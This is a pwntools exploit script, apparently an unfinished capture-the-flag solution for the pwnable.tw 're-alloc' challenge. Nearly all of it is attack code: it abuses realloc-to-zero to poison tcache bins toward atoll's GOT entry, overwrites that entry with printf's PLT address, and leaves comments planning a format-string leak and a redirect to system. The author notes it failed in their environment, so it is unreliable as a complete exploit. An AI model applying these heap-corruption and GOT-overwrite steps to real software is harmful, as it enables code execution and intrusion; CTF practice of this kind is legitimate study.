from pwn import *

context(terminal = ['deepin-terminal','-x','sh','-c'],log_level = 'debug',arch = 'i386',os = 'linux')


debug = 1
ElfPath = './re-alloc'
LibcPath = 'libc.so'
RemoteAddr = 'chall.pwnable.tw'
RemotePort = '10301'

elf = ELF(ElfPath)
if debug:
    sh = process(ElfPath,env={'LD_PRELOAD':LibcPath})
    libc = elf.libc
else:
    sh = remote(RemoteAddr,RemotePort)
    if LibcPath:
       libc = ELF(LibcPath)

def alloc(idx,size,data=''):
    sh.sendlineafter('choice: ','1')
    sh.sendlineafter('Index:',str(idx))
    sh.sendlineafter('Size:',str(size))
    sh.sendlineafter('Data:',data)

def realloc(idx,size,data=''):
    sh.sendlineafter('choice: ','2')
    sh.sendlineafter('Index:',str(idx))
    sh.sendlineafter('Size:',str(size))
    if size:
        sh.sendlineafter('Data:',data)

def free(idx):
    sh.sendlineafter('choice: ','3')
    sh.sendlineafter('Index:',str(idx))

atoll_got = elf.got['atoll']

# make tcache[20] -> atoll_got
alloc(0,0x10,'aaaa')
realloc(0,0)
realloc(0,0x10,p32(atoll_got))
alloc(1,0x10,'aaaa') # there is a judge that heap[i] can't be null if use alloc
# here, only one chunk be used

# make tcache[50] -> atoll_got
# firstly must clear heap[i]
# realloc: new_size > old_size , if the old chunk next to a enough size free chunk(chunk 1), the old chunk will expand over chunk 1 ,chunk 1 will be sliced
realloc(0,0x20,'aaab')
free(0)
realloc(1,0x30,'aaab')
free(1)

if debug:
    gdb.attach(sh)

alloc(0,0x40,'bbbb')
realloc(0,0)
realloc(0,0x40,p32(atoll_got))
alloc(1,0x40,'bbbb')

realloc(0,0x50,'bbbc')
free(0)
realloc(0,0x60,'bbbc')
free(1)


#change atoll_got to printf_plt
alloc(0,0x10,p32(elf.plt['printf']))

# format string vulnerability, get libc_start_main addr on stack 
# make atoll_got to system addr
# warn: the number of string which as printf argv is the real return value

#but my environment is 2.24 , something wrong happend

sh.interactive()
